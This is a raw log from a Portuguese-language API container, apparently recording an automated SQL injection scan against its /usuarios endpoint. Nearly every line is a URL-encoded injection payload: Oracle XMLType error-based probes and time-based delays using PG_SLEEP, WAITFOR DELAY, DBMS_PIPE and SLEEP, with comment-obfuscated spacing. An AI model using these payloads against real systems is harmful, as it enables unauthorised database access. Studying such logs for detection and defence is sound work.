api-1  | Servidor rodando em http://0.0.0.0:8000
api-1  | 172.18.0.1 - GET /usuarios%29%2F%2A%2A%2FAND%2F%2A%2A%2F7813%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28106%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287813%3D7813%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%284250%3D4250 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FAND%2F%2A%2A%2F7813%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28106%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287813%3D7813%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F7813%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28106%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287813%3D7813%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27FgfF%27%3D%27FgfF HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%2F%2A%2A%2FAND%2F%2A%2A%2F7813%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28106%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287813%3D7813%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27oCph%27%3D%27oCph HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FAND%2F%2A%2A%2F7813%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28106%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287813%3D7813%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29--%2F%2A%2A%2Ftgmo HTTP/1.1
api-1  | 172.18.0.1 - GET /%28SELECT%2F%2A%2A%2FCONCAT%28CONCAT%28%27qpjzq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%286215%3D6215%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qzjqq%27%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2870%29%7C%7CCHR%28112%29%7C%7CCHR%28111%29%7C%7CCHR%2898%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2870%29%7C%7CCHR%28112%29%7C%7CCHR%28111%29%7C%7CCHR%2898%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2870%29%7C%7CCHR%28112%29%7C%7CCHR%28111%29%7C%7CCHR%2898%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2870%29%7C%7CCHR%28112%29%7C%7CCHR%28111%29%7C%7CCHR%2898%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F8090%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29sgbf%29%2F%2A%2A%2FAND%2F%2A%2A%2F%284851%3D4851 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F8090%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29sgbf%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F8090%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29sgbf%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27VqyH%27%3D%27VqyH HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F8090%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29sgbf%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27yHnw%27%3D%27yHnw HTTP/1.1
